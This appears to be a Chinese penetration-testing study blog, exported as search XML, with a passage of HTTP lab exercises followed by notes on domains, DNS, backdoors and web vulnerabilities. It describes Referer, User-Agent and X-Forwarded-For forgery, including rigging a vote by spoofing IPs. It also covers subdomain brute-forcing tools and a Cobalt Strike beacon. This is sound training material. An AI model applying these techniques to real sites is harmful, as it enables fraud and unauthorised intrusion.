title="空行"></a>空行</h4><p>最后一个响应头标之后是一个空行，发送回车间和退行，表明服务器以下不再有头标</p><h4 id="响应数据"><a href="#响应数据" class="headerlink" title="响应数据"></a>响应数据</h4><p>HTML文档和图像等，也是HTML本身</p><h3 id="演示案例"><a href="#演示案例" class="headerlink" title="演示案例"></a>演示案例</h3><h4 id="Burp-Suite-抓包"><a href="#Burp-Suite-抓包" class="headerlink" title="Burp Suite 抓包"></a>Burp Suite 抓包</h4><p><img src="https://p.pstatp.com/origin/pgc-image/8642e53d083142d1bcaec7ef42f13b84" style="zoom:67%;" /><img src="https://p.pstatp.com/origin/pgc-image/e4d8a13f5b5748529bf9a24e35525e10"></p><p><img src="https://p.pstatp.com/origin/pgc-image/e4d8a13f5b5748529bf9a24e35525e10"></p><img src="https://p.pstatp.com/origin/pgc-image/ea4d2e62b483443d9167a38473bd1189" style="zoom:67%;" /><h4 id="第三方检测修改实现XSS攻击"><a href="#第三方检测修改实现XSS攻击" class="headerlink" title="第三方检测修改实现XSS攻击"></a>第三方检测修改实现XSS攻击</h4><p>已经被修复了。</p><p><img src="https://p.pstatp.com/origin/pgc-image/f65d99f08f774578a0330c88d1e8ce67"></p><h4 id="来源页伪造"><a href="#来源页伪造" class="headerlink" title="来源页伪造"></a>来源页伪造</h4><p><a href="https://www.mozhe.cn/bug/detail/56">https://www.mozhe.cn/bug/detail/56</a></p><p><img src="https://p.pstatp.com/origin/pgc-image/a6670122175c49cd93232959fe31949b"></p><p>在burp上进行抓包进行来源页吗修改</p><p>修改Referer参数，地址来源</p><p><img src="https://p.pstatp.com/origin/pgc-image/0922534728924315a0a3fa06f7095bfb"></p><p><img src="https://p.pstatp.com/origin/pgc-image/9d21d2f9d38e465295a83947c4488e39"></p><h4 id="浏览器信息伪造"><a href="#浏览器信息伪造" class="headerlink" title="浏览器信息伪造"></a>浏览器信息伪造</h4><img src="https://p.pstatp.com/origin/pgc-image/81e5d54050674e2fbc50609c13bce880" style="zoom:80%;" /><p>需要伪造IPhone手机和2G信号</p><p>通过伪造User-Agent来实现</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Mozilla/5.0 (iPhone; CPU iPhone OS 8_0 like Mac OS X)AppleWebKit/600.1.4 (KHTML, like Gecko) Mobile/12A365 MicroMessenger/6.0NetType/2G</span><br></pre></td></tr></table></figure><p><img src="https://p.pstatp.com/origin/pgc-image/a7764c582fd24bf7a4e1269ffbe7ae2d"></p><p>成功伪造</p><p><img src="https://p.pstatp.com/origin/pgc-image/6c5e25852b7c4cad98645f7f2b7b060a"></p><h4 id="HTTP动作练习"><a href="#HTTP动作练习" class="headerlink" title="HTTP动作练习"></a>HTTP动作练习</h4><p>这里应该是需要将GET方式改为POST方式，bp抓包然后选择变更请求方式，然后发包。</p><img src="https://p.pstatp.com/origin/pgc-image/0097ec344087463db15a174962ea1e8c" style="zoom:67%;" /><h4 id="投票系统缺陷"><a href="#投票系统缺陷" class="headerlink" title="投票系统缺陷"></a>投票系统缺陷</h4><p>要求让ggg获得第一。</p><p>抓一下包看一下。应该是通过ip去限制投票次数，这里使用<code>X-Forwarded-For</code>来伪造ip，然后就可以无限投票了。</p><img src="https://p.pstatp.com/origin/pgc-image/adb3167cc5cc481581441f254a9aec78" style="zoom:67%;" /><p>成功得到第一</p><p><img src="https://p.pstatp.com/origin/pgc-image/6f1fe0e72a6a47a0a06fad49b3e9e485"></p>]]></content>
      
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> 小迪学习笔记 </tag>
            
            <tag> 基础入门 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>01基础入门--概念名词</title>
      <link href="/2021/09/10/01%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8-%E6%A6%82%E5%BF%B5%E5%90%8D%E8%AF%8D/"/>
      <url>/2021/09/10/01%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8-%E6%A6%82%E5%BF%B5%E5%90%8D%E8%AF%8D/</url>
      
        <content type="html"><![CDATA[<p>😆😆😆😆😆😆</p><span id="more"></span><h3 id="域名"><a href="#域名" class="headerlink" title="域名"></a>域名</h3><h4 id="什么是域名"><a href="#什么是域名" class="headerlink" title="什么是域名"></a>什么是域名</h4><p>域名（Domain names）是互联网基础架构的关键部分。它们为互联网上任何可用的网页服务器提供了方便人类理解的地址。</p><p>任何连上互联网的电脑都可以通过一个公共IP地址访问到，对于IPv4地址来说，这个地址有32位（它们通常写成四个范围在0~255以内，由点分隔的数字组成，比如173.194.121.32），而对于IPv6来说，这个地址有128位，通常写成八组由冒号分隔的四个十六进制数(e.g., <code>2027:0da8:8b73:0000:0000:8a2e:0370:1337</code>). 计算机可以很容易地处理这些IP地址, 但是对一个人来说很难找出谁在操控这些服务器以及这些网站提供什么服务。IP 地址很难记忆而且可能会随着时间的推移发生改变 。为了解决这些问题，我们使用方便记忆的地址，称作域名。</p><h4 id="域名在哪里注册"><a href="#域名在哪里注册" class="headerlink" title="域名在哪里注册"></a>域名在哪里注册</h4><p>域名注册是Internet中用于解决地址对应问题的一种方法。根据中国互联网络域名管理办法，域名注册服务机构及域名注册管理机构需对申请人提出的域名是否违反了第三方的权利和申请人的真实身份进行核验。每一个相同顶级域名中的二级域名注册都是独一无二的，不可重复的，但不同顶级域名中的二级域名可以是相同的，例如baidu这个二级域名曾可以在.com中注册，也可以在.cn中注册，也可以在.xyz中及其他多种顶级域名中注册，且每个域名都起到同样的作用。因此，在网络上域名是一种相对有限的资源，它的价值随着注册企业和个人用户的增多而逐步为人们所重视。一般域名需要通过域名注册商去注册。</p><h4 id="顶级域名、一级域名"><a href="#顶级域名、一级域名" class="headerlink" title="顶级域名、一级域名"></a>顶级域名、一级域名</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">Top-level domains，first-level domains（TLDs），也翻译为国际顶级域名，也成一级域名。</span><br><span class="line">　　.com 供商业机构使用，但无限制最常用</span><br><span class="line">　　.net 原供网络服务供应商使用，现无限制</span><br><span class="line">　　.org 原供不属于其他通用顶级域类别的组织使用，现无限制</span><br><span class="line">　　.edu / .gov / .mil 供美国教育机构/美国政府机关/美国军事机构。因历史遗留问题一般只在美国专用</span><br><span class="line">　　.aero 供航空运输业使用</span><br><span class="line">　　.biz 供商业使用</span><br><span class="line">　　.coop 供联合会（cooperatives）使用</span><br><span class="line">　　.info 供信息性网站使用，但无限制</span><br><span class="line">　　.museum 供博物馆使用</span><br><span class="line">　　.name 供家庭及个人使用</span><br><span class="line">　　.pro 供部分专业使用</span><br><span class="line">　　.asia 供亚洲社区使用</span><br><span class="line">　　.tel 供连接电话网络与因特网的服务使用</span><br><span class="line">　　.post 供邮政服务使用</span><br><span class="line">　　.mail 供邮件网站使用</span><br><span class="line">　　国家顶级域名：cn（中国大陆）、de（德国）、eu（欧盟）、jp（日本）、hk（中国香港）、tw（中国台湾）、uk（英国）、us（美国）</span><br></pre></td></tr></table></figure><h4 id="什么是二级域名多级域名？"><a href="#什么是二级域名多级域名？" class="headerlink" title="什么是二级域名多级域名？"></a>什么是二级域名多级域名？</h4><p>二级域（或称二级域名；英语：Second-level domain；英文缩写：SLD）是互联网DNS等级之中，处于顶级域名之下的域。二级域名是域名的倒数第二个部分，例如在域名example.baidu.com中，二级域名是Baidu。</p><p>　　.com 顶级域名/一级域名，更准确的说叫顶级域</p><p>　　baidu.com 二级域名，更准确的说叫二级域</p><p>　　tieba.baidu.com 三级域名，更准确的说叫三级域</p><p>　　detail.tieba.baidu.com 四级域名，更准确的说叫四级域</p><p>…….</p><h4 id="域名发现对于安全测试意义？"><a href="#域名发现对于安全测试意义？" class="headerlink" title="域名发现对于安全测试意义？"></a>域名发现对于安全测试意义？</h4><p>    进行渗透测试时，其主域名找不到漏洞时，就可以尝试去测试收集到的子域名，有可能测试子域名网站时会有意向不到的效果，然后可以由此横向到主网站。</p><h3 id="DNS"><a href="#DNS" class="headerlink" title="DNS"></a>DNS</h3><h4 id="什么是DNS？"><a href="#什么是DNS？" class="headerlink" title="什么是DNS？"></a>什么是DNS？</h4><p>DNS（Domain Name Server，域名服务器）是进行域名(domain name)和与之相对应的IP地址 (IP address)转换的服务器。DNS中保存了一张域名(domain name)和与之相对应的IP地址 (IP address)的表，以解析消息的域名。 例如百度的域名是<a href="http://www.baidu.com,在dns中对应的ip是1.2.3.4(假设),那么我们在浏览器中输入百度的域名,dns就会解析为1.2.3.4./">www.baidu.com,在DNS中对应的IP是1.2.3.4(假设),那么我们在浏览器中输入百度的域名，DNS就会解析为1.2.3.4。</a></p><h4 id="本地HOSTS与DNS的关系？"><a href="#本地HOSTS与DNS的关系？" class="headerlink" title="本地HOSTS与DNS的关系？"></a>本地HOSTS与DNS的关系？</h4><p>客户端查询DNS的过程是：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">本地host文件—本地缓存—-DNS服务器</span><br></pre></td></tr></table></figure><p>Hosts文件目录</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">在Windows中，它的目录通常在C盘的Windows\system32\drivers\etc\下。</span><br></pre></td></tr></table></figure><p>Hosts文件是一个纯文本文件，用记事本就可以将其打开。这个文件是根据TCP/IP for Windows 的标准来工作的，它的作用是包含IP地址和Host name(主机名)的映射关系，每段只能包括一个映射关系，IP地址要放在每段的最前面，后面写Host name(主机名)，中间加个空格。如：<code>127.0.0.1 localhost</code>.</p><p>我们知道，当电脑访问网站时，首先通过DNS服务器把网络 <a href="https://cloud.tencent.com/product/cns?from=10680">域名解析</a>成IP地址后，我们的计算机才能访问。如果每个域名请求都要等待域名服务器解析后返回IP，访问速度就会比较慢，而Hosts文件正可以解决这个问题。在进行DNS请求以前，Windows系统会先检查Hosts文件中是否有这个地址映射关系，如果有则调用这个IP地址映射，如果没有再向DNS服务器提出域名解析。</p><p>eg：这里用我自己的博客地址作为演示，当我们ping l0ne1y.github.io的时候可以看到他的ip地址是185.199.110.153。</p><p><img src="https://p.pstatp.com/origin/pgc-image/dbba0580625e4cf8956b037c5e6c36c2"></p><p>当我们修改了本地hosts文件后，再次ping l0ne1y.github.io地址，发现ip地址变成了1.2.3.4。</p><p><img src="https://p.pstatp.com/origin/pgc-image/311b8910aa7a4db69ebdfcb9a119b136"></p><p><img src="https://p.pstatp.com/origin/pgc-image/80083fe044f84de5a6f6f0b6c3bc5f27"></p><h4 id="CDN是什么？与DNS的关系？"><a href="#CDN是什么？与DNS的关系？" class="headerlink" title="CDN是什么？与DNS的关系？"></a>CDN是什么？与DNS的关系？</h4><p>CDN的全称是Content Delivery Network，即内容分发网络。CDN是构建在现有网络基础之上的智能虚拟网络，依靠部署在各地的边缘服务器，通过中心平台的负载均衡、内容分发、调度等功能模块，使用户就近获取所需内容，降低网络拥塞，提高用户访问响应速度和命中率。CDN的关键技术主要有内容存储和分发技术。举个例子，现在服务器在北京，深圳的用户想要获取服务器上的数据就需要跨越一个很远的距离，这显然就比北京的用户访问北京的服务器速度要慢。但是现在我们在深圳建立一个CDN服务器，上面缓存住一些数据，深圳用户访问时先访问这个CDN服务器，如果服务器上有用户请求的数据就可以直接返回，这样速度就大大的提升了。</p><p>CDN实际上是一个就近访问，那么现在有一个问题是，我们怎么知道用户的所在位置从而给他分配最佳的CDN节点呢。这就需要DNS服务来进行定位了。当我们通过使用DNS服务的时候，可以根据他使用的LDNS服务器来进行一个定位，例如我们的调度服务器看到他是来自深圳电信的LDNS服务器，那么我们就认为该用户来自深圳电信，然后调度服务器可以让该用户去访问深圳电信的CDN服务器，这样就让用户访问到了最优的CDN节点。通过DNS服务我们可以很快的定位到用户的位置，然后给用户分配最佳CDN节点.</p><h4 id="常见的DNS安全攻击有哪些"><a href="#常见的DNS安全攻击有哪些" class="headerlink" title="常见的DNS安全攻击有哪些?"></a>常见的DNS安全攻击有哪些?</h4><ol><li>域名劫持</li></ol><p>通过采用黑客手段控制了域名管理密码和域名管理邮箱，然后将该域名的NS纪录指向到黑客可以控制的DNS服务器，然后通过在该DNS服务器上添加相应域名纪录，从而使网民访问该域名时，进入了黑客所指向的内容。这显然是DNS服务提供商的责任，用户束手无策。</p><ol start="2"><li>缓存投毒</li></ol><p>利用控制DNS缓存服务器，把原本准备访问某网站的用户在不知不觉中带到黑客指向的其他网站上。其实现方式有多种，比如可以通过利用网民ISP端的DNS缓存服务器的漏洞进行攻击或控制，从而改变该ISP内的用户访问域名的响应结果;或者，黑客通过利用用户权威域名服务器上的漏洞，如当用户权威域名服务器同时可以被当作缓存服务器使用，黑客可以实现缓存投毒，将错误的域名纪录存入缓存中，从而使所有使用该缓存服务器的用户得到错误的DNS解析结果。</p><p>3)DDOS攻击</p><p>一种攻击针对DNS服务器软件本身，通常利用BIND软件程序中的漏洞，导致DNS服务器崩溃或拒绝服务;另一种攻击的目标不是DNS服务器，而是利用DNS服务器作为中间的“攻击放大器”，去攻击其它互联网上的主机，导致被攻击主机拒绝服务。</p><ol start="4"><li>DNS欺骗</li></ol><p>DNS欺骗就是攻击者冒充域名服务器的一种欺骗行为。</p><p>原理：如果可以冒充域名服务器，然后把查询的IP地址设为攻击者的IP地址，这样的话，用户上网就只能看到攻击者的主页，而不是用户想要取得的网站的主页了，这就是DNS欺骗的基本原理。DNS欺骗其实并不是真的“黑掉”了对方的网站，而是冒名顶替、招摇撞骗罢了。</p><h3 id="脚本语言"><a href="#脚本语言" class="headerlink" title="脚本语言"></a>脚本语言</h3><h4 id="常见的脚本语言类型有哪些？"><a href="#常见的脚本语言类型有哪些？" class="headerlink" title="常见的脚本语言类型有哪些？"></a>常见的脚本语言类型有哪些？</h4><p>脚本语言又被称为扩建的语言，或者动态语言，是一种编程语言，用来控制软件应用程序，脚本通常以文本（如ASCII)保存，只在被调用时进行解释或编译。<br>Scala、JavaScript，VBScript，ActionScript，MAXScript，ASP，JSP，PHP，SQL，Perl，Shell，python，Ruby，JavaFX，Lua，AutoIt等</p><h4 id="不同脚本类型与安全漏洞的关系？"><a href="#不同脚本类型与安全漏洞的关系？" class="headerlink" title="不同脚本类型与安全漏洞的关系？"></a>不同脚本类型与安全漏洞的关系？</h4><p>不同的脚本语言决定了安全漏洞的多少。</p><h4 id="漏洞挖掘代码审计与脚本类型的关系？"><a href="#漏洞挖掘代码审计与脚本类型的关系？" class="headerlink" title="漏洞挖掘代码审计与脚本类型的关系？"></a>漏洞挖掘代码审计与脚本类型的关系？</h4><p>同上</p><h3 id="后门"><a href="#后门" class="headerlink" title="后门"></a>后门</h3><h4 id="什么是后门？有那些后门？"><a href="#什么是后门？有那些后门？" class="headerlink" title="什么是后门？有那些后门？"></a>什么是后门？有那些后门？</h4><p>后门是指绕过安全控制而获取对程序或系统访问权的方法。后门的最主要目的就是方便以后再次秘密进入或者控制系统。根据实现方式的不同，可以将后门分为网页后门、线程插入后门、扩展后门、C/S 后门和账户后门等类型。</p><h4 id="后门在安全测试中的实际意义？"><a href="#后门在安全测试中的实际意义？" class="headerlink" title="后门在安全测试中的实际意义？"></a>后门在安全测试中的实际意义？</h4><p>(1)方便下次更方便的进来。 </p><p>(2)获取到相关权限之后，后门相当于一个管道，便于操作。</p><h3 id="关于后门需要了解那些？（玩法，免杀）"><a href="#关于后门需要了解那些？（玩法，免杀）" class="headerlink" title="关于后门需要了解那些？（玩法，免杀）"></a>关于后门需要了解那些？（玩法，免杀）</h3><p>免杀，就是绕过杀毒软件的防护，避免被检测到。</p><h3 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h3><h4 id="WEB-的组成架构模型？"><a href="#WEB-的组成架构模型？" class="headerlink" title="WEB 的组成架构模型？"></a>WEB 的组成架构模型？</h4><p>网站源码：分脚本类型，分应用方向<br>操作系统：windows linux<br>中间件（搭建平台）：apache iis tomcat nginx 等<br>数据库：access mysql mssql oracle sybase db2 postsql 等</p><h4 id="架构漏洞安全测试简要介绍？"><a href="#架构漏洞安全测试简要介绍？" class="headerlink" title="架构漏洞安全测试简要介绍？"></a>架构漏洞安全测试简要介绍？</h4><p>web网站-数据库权限-权限提升-内网。</p><h4 id="为什么要从-WEB-层面为主为首？"><a href="#为什么要从-WEB-层面为主为首？" class="headerlink" title="为什么要从 WEB 层面为主为首？"></a>为什么要从 WEB 层面为主为首？</h4><p>不管是PC还是APP本质上都可以以web为突破口。</p><h3 id="WEB相关安全漏洞"><a href="#WEB相关安全漏洞" class="headerlink" title="WEB相关安全漏洞"></a>WEB相关安全漏洞</h3><h4 id="WEB-源码类对应漏洞"><a href="#WEB-源码类对应漏洞" class="headerlink" title="WEB 源码类对应漏洞"></a>WEB 源码类对应漏洞</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">SQL 注入</span><br><span class="line">文件上传</span><br><span class="line">XSS</span><br><span class="line">代码执行</span><br><span class="line">变量覆盖</span><br><span class="line">逻辑漏洞</span><br><span class="line">反序列化等</span><br></pre></td></tr></table></figure><h4 id="WEB-中间件对应漏洞"><a href="#WEB-中间件对应漏洞" class="headerlink" title="WEB 中间件对应漏洞"></a>WEB 中间件对应漏洞</h4><p>未授权访问等等</p><h4 id="WEB-数据库对应漏洞"><a href="#WEB-数据库对应漏洞" class="headerlink" title="WEB 数据库对应漏洞"></a>WEB 数据库对应漏洞</h4><p>弱口令等</p><h4 id="WEB-系统层对应漏洞"><a href="#WEB-系统层对应漏洞" class="headerlink" title="WEB 系统层对应漏洞"></a>WEB 系统层对应漏洞</h4><p>提权相关的</p><h4 id="其他第三方对应漏洞"><a href="#其他第三方对应漏洞" class="headerlink" title="其他第三方对应漏洞"></a>其他第三方对应漏洞</h4><p>第三方软件的一些漏洞 eg:QQ</p><p>APP 或 PC 应用结合类</p><p>App或者PC软件的漏洞</p><h3 id="演示案例"><a href="#演示案例" class="headerlink" title="演示案例"></a>演示案例</h3><h4 id="多级域名的枚举查找"><a href="#多级域名的枚举查找" class="headerlink" title="多级域名的枚举查找"></a>多级域名的枚举查找</h4><p>1.直接百度</p><p><img src="https://p.pstatp.com/origin/pgc-image/a167f286af034ef4b52cfefbff4a4a26"></p><p>2.通过工具进行爆破</p><p><img src="https://p.pstatp.com/origin/pgc-image/b3befccfafed4a54aa56797d0510b66d"></p><p>这里我使用的是Layer子域名爆破工具，下载链接是<code>https://github.com/euphrat1ca/LayerDomainFinder</code>，字典是<code>https://github.com/k8gege/PasswordDic</code>。</p><p>3.域名注册</p><p> 查询A记录、MX记录、C记录</p><h4 id="DNS解析修改后分析（本地或服务）"><a href="#DNS解析修改后分析（本地或服务）" class="headerlink" title="DNS解析修改后分析（本地或服务）"></a>DNS解析修改后分析（本地或服务）</h4><p>前面有实验过，这里就不弄了。</p><h4 id="EXE-后门功能及危害及类似-WEB-后门"><a href="#EXE-后门功能及危害及类似-WEB-后门" class="headerlink" title="EXE 后门功能及危害及类似 WEB 后门"></a>EXE 后门功能及危害及类似 WEB 后门</h4><p>这里因为没有视频中的软件，所有我这里使用的是CS，进行上线。</p><p>关于CS具体操作可以看<code>https://soapffz.com/sec/483.html</code></p><p><img src="https://p.pstatp.com/origin/pgc-image/e52e0b1607f949f9969c455f4590d680"></p><p>可以看到成功上线了。</p><h4 id="APP类结合WEB协议，PC类结合WEB协议"><a href="#APP类结合WEB协议，PC类结合WEB协议" class="headerlink" title="APP类结合WEB协议，PC类结合WEB协议"></a>APP类结合WEB协议，PC类结合WEB协议</h4><p>手机模拟器</p><p>需要设置代理，代理ip为PC端ip。</p><p><img src="https://p.pstatp.com/origin/pgc-image/250377100e2f44e59eff800692b6280f"></p><p>PC端需要通过burp suite进行抓包，设置brup监听端口为代理服务器端口。</p><p><img src="https://p.pstatp.com/origin/pgc-image/76348fc1d8dd41eab976fbd3f3166592"></p><p>之后修改数据包，修改电脑数据包和手机端一致，从app分离出WEB 测试漏洞。</p>]]></content>
      
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> 小迪学习笔记 </tag>
            
            <tag> 基础入门 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
